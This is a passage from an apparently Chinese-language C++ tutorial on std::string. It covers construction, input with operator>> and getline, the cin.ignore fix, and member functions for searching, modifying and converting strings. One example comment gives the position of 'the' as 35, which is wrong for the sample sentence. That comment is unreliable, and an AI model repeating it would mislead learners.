class="string">&#x27;x&#x27;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* phrase = <span class="string">&quot;World Wide Web&quot;</span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s5</span><span class="params">(phrase, <span class="number">5</span>)</span></span>; <span class="comment">// &quot;World&quot;</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s6</span><span class="params">(phrase + <span class="number">6</span>, <span class="number">4</span>)</span></span>; <span class="comment">// &quot;Wide&quot; (从索引6开始取4个)</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s7</span><span class="params">(s2, <span class="number">1</span>, <span class="number">3</span>)</span></span>; <span class="comment">// 从 s2[1] 开始取 3 个: &quot;ell&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1: &quot;</span> &lt;&lt; s1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s2: &quot;</span> &lt;&lt; s2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s3: &quot;</span> &lt;&lt; s3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s4: &quot;</span> &lt;&lt; s4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s5: &quot;</span> &lt;&lt; s5 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s6: &quot;</span> &lt;&lt; s6 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s7: &quot;</span> &lt;&lt; s7 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-1-2-string-类输入"><a href="#16-1-2-string-类输入" class="headerlink" title="16.1.2 string 类输入"></a>16.1.2 string 类输入</h3><p>从输入流（如 <code>cin</code>）读取数据到 <code>string</code> 对象主要有两种方式：</p><ol><li><p><strong>使用 <code>operator&gt;&gt;</code>:</strong></p><ul><li><p>  行为类似于读取 C 风格字符串或基本数据类型。</p></li><li><p>  它会<strong>跳过开头</strong>的所有空白字符（空格、制表符、换行符）。</p></li><li><p>  然后读取非空白字符，直到遇到下一个空白字符为止。</p></li><li><p>读取的内容（不包括结尾的空白字符）存储在 <code>string</code> 对象中。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt; // 用于字符串流示例</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> word1, word2;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter two words separated by space: &quot;</span>; <span class="comment">// 例如输入 &quot;Hello World&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; word1 &gt;&gt; word2;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Word 1: &quot;</span> &lt;&lt; word1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &quot;Hello&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Word 2: &quot;</span> &lt;&lt; word2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &quot;World&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 演示跳过空白</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">stringstream</span> <span class="title">ss</span><span class="params">(<span class="string">&quot;   LeadingSpaces Word&quot;</span>)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> temp;</span><br><span class="line">    ss &gt;&gt; temp;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After skipping spaces: &quot;</span> &lt;&lt; temp &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &quot;LeadingSpaces&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>使用 <code>getline()</code> 函数:</strong></p><ul><li><p>  用于读取<strong>一整行</strong>输入，直到遇到指定的分隔符（默认为换行符 <code>\n</code>）。</p></li><li><p>  <strong>不会</strong>跳过开头的空白字符。</p></li><li><p>  读取的内容（<strong>不包括</strong>分隔符本身）存储在 <code>string</code> 对象中。</p></li><li><p>  分隔符会从输入流中被读取并丢弃。</p></li><li><p>*函数原型:**</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;istream&gt; // getline 定义在这里</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">std</span>::istream&amp; <span class="title">getline</span><span class="params">(<span class="built_in">std</span>::istream&amp; is, <span class="built_in">std</span>::<span class="built_in">string</span>&amp; str, <span class="keyword">char</span> delim = <span class="string">&#x27;\n&#x27;</span>)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> line1, line2;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a line of text: &quot;</span>;</span><br><span class="line">    <span class="comment">// 注意：如果之前有 &gt;&gt; 操作，可能需要清除缓冲区中的换行符</span></span><br><span class="line">    <span class="comment">// std::cin.ignore(std::numeric_limits&lt;std::streamsize&gt;::max(), &#x27;\n&#x27;);</span></span><br><span class="line">    getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, line1); <span class="comment">// 读取整行，直到按 Enter</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter another line: &quot;</span>;</span><br><span class="line">    getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, line2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Line 1: &quot;</span> &lt;&lt; line1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Line 2: &quot;</span> &lt;&lt; line2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><p><strong>混合使用 <code>&gt;&gt;</code> 和 <code>getline()</code> 的问题:</strong><br>当 <code>&gt;&gt;</code> 读取输入后，它会将导致读取结束的空白字符（通常是换行符）留在输入缓冲区中。如果紧接着调用 <code>getline()</code>，它会立即读到这个换行符，认为读取到空行，然后结束。</p><p><strong>解决方法:</strong> 在 <code>&gt;&gt;</code> 之后、<code>getline()</code> 之前，清除缓冲区中残留的换行符。常用的方法是使用 <code>cin.ignore()</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits&gt; // for numeric_limits</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清除 cin &gt;&gt; age 后留下的换行符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="built_in">std</span>::numeric_limits&lt;<span class="built_in">std</span>::streamsize&gt;::max(), <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your full name: &quot;</span>;</span><br><span class="line">    getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, name);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot;, Name: &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-1-3-使用字符串"><a href="#16-1-3-使用字符串" class="headerlink" title="16.1.3 使用字符串"></a>16.1.3 使用字符串</h3><p><code>string</code> 类提供了丰富的成员函数来操作字符串：</p><ul><li><p><strong>赋值:</strong> 使用 <code>operator=</code>。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> s1 = <span class="string">&quot;Initial&quot;</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> s2;</span><br><span class="line">s2 = s1; <span class="comment">// s2 内容变为 &quot;Initial&quot;</span></span><br><span class="line">s2 = <span class="string">&quot;New Value&quot;</span>; <span class="comment">// s2 内容变为 &quot;New Value&quot;</span></span><br><span class="line">s2 = <span class="string">&#x27;C&#x27;</span>; <span class="comment">// s2 内容变为 &quot;C&quot;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>拼接/连接:</strong> 使用 <code>operator+</code> 或 <code>operator+=</code>。可以与 <code>string</code> 对象、C 风格字符串或单个字符拼接。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> first = <span class="string">&quot;John&quot;</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> last = <span class="string">&quot;Doe&quot;</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> full = first + <span class="string">&quot; &quot;</span> + last; <span class="comment">// full 是 &quot;John Doe&quot;</span></span><br><span class="line">first += <span class="string">&quot;athan&quot;</span>; <span class="comment">// first 变为 &quot;Johnathan&quot;</span></span><br><span class="line">full += <span class="string">&#x27;!&#x27;</span>; <span class="comment">// full 变为 &quot;John Doe!&quot;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>比较:</strong> 使用关系运算符 (<code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>)。比较是按字典顺序进行的。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> str1 = <span class="string">&quot;Apple&quot;</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> str2 = <span class="string">&quot;Banana&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (str1 &lt; str2) &#123; <span class="comment">// true</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; str1 &lt;&lt; <span class="string">&quot; comes before &quot;</span> &lt;&lt; str2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (str1 == <span class="string">&quot;Apple&quot;</span>) &#123; <span class="comment">// true</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;str1 is Apple&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>获取长度/大小:</strong> 使用 <code>length()</code> 或 <code>size()</code> 方法（两者等价）。返回字符串中的字符数。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> msg = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length: &quot;</span> &lt;&lt; msg.length() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 5</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size: &quot;</span> &lt;&lt; msg.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 输出 5</span></span><br></pre></td></tr></table></figure></li><li><p><strong>访问字符:</strong></p><ul><li><p>  <code>operator[]</code>: 提供快速访问，但<strong>不进行边界检查</strong>。访问越界是未定义行为。</p></li><li><p><code>at()</code>: 提供边界检查的访问。如果索引越界，会抛出 <code>std::out_of_range</code> 异常。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> word = <span class="string">&quot;World&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> first_char = word[<span class="number">0</span>]; <span class="comment">// &#x27;W&#x27;</span></span><br><span class="line"><span class="keyword">char</span> last_char = word[word.length() - <span class="number">1</span>]; <span class="comment">// &#x27;d&#x27;</span></span><br><span class="line"><span class="comment">// word[5] = &#x27;!&#x27;; // 危险！越界访问，未定义行为</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">char</span> c = word.at(<span class="number">1</span>); <span class="comment">// &#x27;o&#x27;</span></span><br><span class="line">    word.at(<span class="number">0</span>) = <span class="string">&#x27;J&#x27;</span>; <span class="comment">// word 变为 &quot;Jorld&quot;</span></span><br><span class="line">    c = word.at(<span class="number">10</span>); <span class="comment">// 越界，将抛出异常</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">const</span> <span class="built_in">std</span>::out_of_range&amp; oor) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Out of Range error: &quot;</span> &lt;&lt; oor.what() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>查找:</strong> <code>string</code> 提供了多种查找方法：</p><ul><li><p>  <code>find(substr, pos=0)</code>: 从索引 <code>pos</code> 开始查找子串 <code>substr</code> 第一次出现的位置。</p></li><li><p>  <code>rfind(substr, pos=npos)</code>: 从索引 <code>pos</code> 向前查找子串 <code>substr</code> 最后一次出现的位置。</p></li><li><p>  <code>find_first_of(chars, pos=0)</code>: 从 <code>pos</code> 开始查找 <code>chars</code> 中<strong>任何一个</strong>字符第一次出现的位置。</p></li><li><p>  <code>find_last_of(chars, pos=npos)</code>: 从 <code>pos</code> 向前查找 <code>chars</code> 中<strong>任何一个</strong>字符最后一次出现的位置。</p></li><li><p>  <code>find_first_not_of(chars, pos=0)</code>: 从 <code>pos</code> 开始查找<strong>第一个不</strong>在 <code>chars</code> 中的字符的位置。</p></li><li><p>  <code>find_last_not_of(chars, pos=npos)</code>: 从 <code>pos</code> 向前查找<strong>最后一个不</strong>在 <code>chars</code> 中的字符的位置。</p></li><li><p>所有查找方法如果找到，返回匹配的起始索引；如果找不到，返回 <code>std::string::npos</code> (一个静态成员常量，通常是 <code>-1</code> 或最大无符号整数值)。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> text = <span class="string">&quot;The quick brown fox jumps over the lazy dog.&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> search_str = <span class="string">&quot;the&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> vowels = <span class="string">&quot;aeiouAEIOU&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pos = text.find(search_str); <span class="comment">// 查找 &quot;the&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (pos != <span class="built_in">std</span>::<span class="built_in">string</span>::npos) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; search_str &lt;&lt; <span class="string">&quot;&#x27; found at index: &quot;</span> &lt;&lt; pos &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 35</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; search_str &lt;&lt; <span class="string">&quot;&#x27; not found.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pos = text.find(<span class="string">&quot;The&quot;</span>); <span class="comment">// 查找 &quot;The&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (pos != <span class="built_in">std</span>::<span class="built_in">string</span>::npos) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;The&#x27; found at index: &quot;</span> &lt;&lt; pos &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pos = text.find_first_of(vowels); <span class="comment">// 查找第一个元音</span></span><br><span class="line">    <span class="keyword">if</span> (pos != <span class="built_in">std</span>::<span class="built_in">string</span>::npos) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First vowel &#x27;&quot;</span> &lt;&lt; text[pos] &lt;&lt; <span class="string">&quot;&#x27; found at index: &quot;</span> &lt;&lt; pos &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &#x27;e&#x27; at 2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pos = text.find_first_not_of(<span class="string">&quot; &quot;</span>); <span class="comment">// 查找第一个非空格</span></span><br><span class="line">    <span class="keyword">if</span> (pos != <span class="built_in">std</span>::<span class="built_in">string</span>::npos) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First non-space &#x27;&quot;</span> &lt;&lt; text[pos] &lt;&lt; <span class="string">&quot;&#x27; found at index: &quot;</span> &lt;&lt; pos &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &#x27;T&#x27; at 0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>修改:</strong></p><ul><li><p>  <code>insert(pos, str)</code>: 在索引 <code>pos</code> 处插入字符串 <code>str</code>。</p></li><li><p>  <code>erase(pos, count)</code>: 从索引 <code>pos</code> 开始删除 <code>count</code> 个字符。</p></li><li><p>  <code>replace(pos, count, str)</code>: 将从 <code>pos</code> 开始的 <code>count</code> 个字符替换为 <code>str</code>。</p></li><li><p>  <code>append(str)</code>: 在末尾追加 <code>str</code> (等价于 <code>+=</code>)。</p></li><li><p><code>assign(str)</code>: 替换整个字符串内容为 <code>str</code> (等价于 <code>=</code>)。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> phrase = <span class="string">&quot;Hello world&quot;</span>;</span><br><span class="line">phrase.insert(<span class="number">6</span>, <span class="string">&quot;beautiful &quot;</span>); <span class="comment">// &quot;Hello beautiful world&quot;</span></span><br><span class="line">phrase.erase(<span class="number">0</span>, <span class="number">6</span>); <span class="comment">// &quot;beautiful world&quot;</span></span><br><span class="line">phrase.replace(<span class="number">0</span>, <span class="number">9</span>, <span class="string">&quot;Wonderful&quot;</span>); <span class="comment">// &quot;Wonderful world&quot;</span></span><br><span class="line">phrase.append(<span class="string">&quot;!&quot;</span>); <span class="comment">// &quot;Wonderful world!&quot;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>获取 C 风格字符串:</strong></p><ul><li><p>  <code>c_str()</code>: 返回一个指向以空字符结尾的 <code>const char*</code> 数组的指针，内容与 <code>string</code> 对象相同。返回的指针指向的内存在 <code>string</code> 对象被修改或销毁后可能失效。</p></li><li><p><code>data()</code>: 类似 <code>c_str()</code>，但在 C++11 之前不保证以空字符结尾（C++11 起保证结尾有 <code>\0</code>）。</p><p>当你需要将 <code>string</code> 对象传递给需要 <code>const char*</code> 的 C 风格函数时，这两个方法非常有用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt; // for printf</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> cpp_str = <span class="string">&quot;C++ String&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Using c_str(): %s\n&quot;</span>, cpp_str.c_str());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="16-1-4-string-还提供了哪些功能"><a href="#16-1-4-string-还提供了哪些功能" class="headerlink" title="16.1.4 string 还提供了哪些功能"></a>16.1.4 string 还提供了哪些功能</h3><p><code>std::string</code> 类还有许多其他功能，包括：</p><ul><li><strong>容量管理:</strong><ul><li>  <code>capacity()</code>: 返回当前分配的内存容量（可能大于 <code>size()</code>）。</li><li>  <code>reserve(n)</code>: 请求至少为 <code>n</code> 的容量。如果 <code>n</code> 大于当前容量，可能重新分配内存。</li><li>  <code>shrink_to_fit()</code> (C++11): 请求减少容量以匹配当前大小。</li><li>  <code>clear()</code>: 清空字符串内容（<code>size()</code> 变为 0）。</li><li>  <code>empty()</code>: 检查字符串是否为空（<code>size() == 0</code>）。</li></ul></li><li>  <strong>迭代器:</strong> 提供 <code>begin()</code>, <code>end()</code>, <code>rbegin()</code>, <code>rend()</code> 等迭代器，允许像遍历容器一样遍历字符串中的字符，可以配合 STL 算法使用。</li><li>  <strong>子字符串:</strong> <code>substr(pos, count)</code>: 返回一个新的 <code>string</code> 对象，包含从 <code>pos</code> 开始的 <code>count</code> 个字符的子串。</li><li>  <strong>比较:</strong> <code>compare()</code> 方法提供比关系运算符更详细的比较选项。</li><li>  <strong>数值转换 (C++11):</strong> <code>&lt;string&gt;</code> 头文件还包含 <code>stoi</code>, <code>stol</code>, <code>stod</code>, <code>to_string</code> 等函数，用于字符串和数值类型之间的转换。</li></ul><p>要了解 <code>string</code> 类的所有功能，建议查阅 C++ 参考文档（如 cppreference.com）。</p><h3 id="16-1-5-字符串种类"><a href="#16-1-5-字符串种类" class="headerlink" title="16.1.5 字符串种类"></a>16.1.5 字符串种类</h3><p><code>std::string</code> 是 <code>std::basic_string&lt;char&gt;</code> 的别名，用于处理基于 <code>char</code> 的窄字符字符串（通常是 ASCII 或 UTF-8 编码）。</p><p>C++ 标准库还提供了处理其他字符类型的 <code>basic_string</code> 特化版本：</p><ul><li>  <strong><code>std::wstring</code>:</strong> <code>basic_string&lt;wchar_t&gt;</code> 的别名，用于处理宽字符 (<code>wchar_t</code>) 字符串，常用于 Windows API 中的 Unicode。</li><li>  <strong><code>std::u16string</code> (C++11):</strong> <code>basic_string&lt;char16_t&gt;</code> 的别名，用于处理 UTF-16 编码的字符串。</li><li>  